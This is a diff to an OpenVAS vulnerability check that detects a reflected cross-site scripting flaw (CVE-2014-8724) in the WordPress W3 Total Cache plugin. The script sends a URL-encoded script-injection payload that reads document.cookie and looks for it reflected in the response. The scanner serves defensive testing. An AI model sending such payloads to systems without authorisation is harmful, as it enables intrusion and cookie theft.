@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wp_w3_total_cache_xss_vuln.nasl 6692 2017-07-12 09:57:43Z teissa $
+# $Id: gb_wp_w3_total_cache_xss_vuln.nasl 10000 2018-05-29 12:20:12Z cfischer $
 #
 # Wordpress W3 Total Cache Cross Site Scripting Vulnerability
 #
@@ -29,12 +29,12 @@ CPE = "cpe:/a:wordpress:wordpress";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805117");
-  script_version("$Revision: 6692 $");
+  script_version("$Revision: 10000 $");
   script_cve_id("CVE-2014-8724");
   script_bugtraq_id(71665);
   script_tag(name:"cvss_base", value:"4.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2017-07-12 11:57:43 +0200 (Wed, 12 Jul 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-05-29 14:20:12 +0200 (Tue, 29 May 2018) $");
   script_tag(name:"creation_date", value:"2014-12-23 19:03:57 +0530 (Tue, 23 Dec 2014)");
   script_name("Wordpress W3 Total Cache Cross Site Scripting Vulnerability");
 
@@ -76,48 +76,30 @@ if(description)
   exit(0);
 }
 
-
 include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
 
-## Variable Initialization
-http_port = 0;
-dir = "";
-url = "";
-
-## Get HTTP Port
 if(!http_port = get_app_port(cpe:CPE)){
   exit(0);
 }
 
-## Check Host Supports PHP
-if(!can_host_php(port:http_port)){
-  exit(0);
-}
-
-## Get WordPress Location
 if(!dir = get_app_location(cpe:CPE, port:http_port)){
   exit(0);
 }
 
-## Wordpress Plugin URL
 url = dir + "/wp-content/plugins/w3-total-cache/index.html";
 
-## Confirm the plugin
 if(http_vuln_check(port:http_port, url:url,
    check_header:TRUE, pattern:"HTTP/1.. 200 OK"))
 {
-  ## Construct the attack request
   url = dir + '/wp-content/plugins/w3-total-cache/%22%3E%3C'
             + 'script%3Ealert(document.cookie)%3C/script%3E%22';
 
-  ## Try attack and check the response to confirm vulnerability
-  ## Extra check is not possible
   if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
-    pattern:"<script>alert\(document.cookie\)</script>"))
+    pattern:"<script>alert\(document\.cookie\)</script>"))
   {
-    security_message(http_port);
+    security_message(port:http_port);
     exit(0);
   }
 }
